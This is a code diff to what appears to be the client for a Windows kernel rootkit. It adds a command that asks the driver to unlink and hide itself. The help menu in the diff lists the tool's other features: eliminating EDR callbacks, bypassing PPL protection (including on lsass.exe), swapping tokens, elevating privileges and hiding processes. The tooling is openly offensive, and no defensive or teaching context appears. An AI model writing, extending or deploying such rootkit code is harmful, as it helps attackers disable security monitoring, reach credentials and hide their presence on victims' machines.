@@ -43,6 +43,7 @@ struct threadArgs {
 #define IOCTL_PPL_BYPASS CTL_CODE_HIDE(12)
 #define IOCTL_PROC_TOKEN_SWAP CTL_CODE_HIDE(13)
 #define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
+#define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)
 
 
 
@@ -880,6 +881,27 @@ BOOL hideProc(HANDLE hDevice, DWORD pid) {
     return result;
 }
 
+BOOL hideRootkitDrv(HANDLE hDevice) {
+    DWORD bytesReturned;
+    BOOL result;
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_UNLINK_ROOTKIT_DRV,
+        NULL,
+        0,
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+    );
+    if (!result) {
+        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
+    }
+    else {
+        printf("Successfully sent request to unlink rootkit driver.\n");
+    }
+    return result;
+}
 
 int main(int argc, char* argv[])
 {
@@ -1085,15 +1107,15 @@ int main(int argc, char* argv[])
             }
         }
         else if (strncmp(input, "downGrade", 9) == 0) {
-            DWORD pid = atoi(input + 10);
-            if (pid == 0) {
+            DWORD pid1 = atoi(input + 10);
+            if (pid1 == 0) {
                 printf("Invalid PID.\n");
                 continue;
             }
 			DWORD pid2 = FindProcessId("explorer.exe");
-            BOOL result = elevateProc(hDevice, pid, pid2);
+            BOOL result = elevateProc(hDevice, pid1, pid2);
             if (result) {
-                printf("Sent request to downgrade process with PID %lu to non-PPL\n", pid);
+                printf("Sent request to downgrade process with PID %lu to non-PPL\n", pid1);
             }
             else {
                 printf("Failed to send request. Error: %lu\n", GetLastError());
@@ -1112,6 +1134,15 @@ int main(int argc, char* argv[])
             else {
                 printf("Failed to send request. Error: %lu\n", GetLastError());
             }
+		}
+        else if (strncmp(input, "hiderootkitdrv", 14) == 0) {
+			BOOL result = hideRootkitDrv(hDevice);
+            if (result) {
+                printf("Sent request to hide the rootkit driver\n");
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+			}
 		}
         else if (strncmp(input, "help", 4) == 0) {
 			printf("Help menu:\n");
@@ -1132,11 +1163,15 @@ int main(int argc, char* argv[])
 			printf(" - elobjcallback        - Eliminate object notify routine callback\n");
 
 			printf(" - elall                - Eliminate all known EDR callbacks\n\n");     
+
 			printf(" - bypassppl <PID>      - Bypass PPL for a specific process by PID\n");
 			printf(" - bypassppllsass 	    - Bypass PPL for lsass.exe\n\n");
 			printf(" - elevatelocal <PID>   - Elevate a specific process by PID using local system\n");
 			printf(" - downGrade <PID>      - Downgrade a specific process by PID to non-PPL\n\n");
-			printf(" - hideproc <PID>       - Hide a specific process by PID\n\n");
+
+			printf(" - hideproc <PID>       - Hide a specific process by PID\n");
+			printf(" - hiderootkitdrv	    - Hide the rootkit driver\n\n");
+
 			printf(" - help                 - Show this help menu\n");
             printf(" - exit                 - Exit the program\n");
 
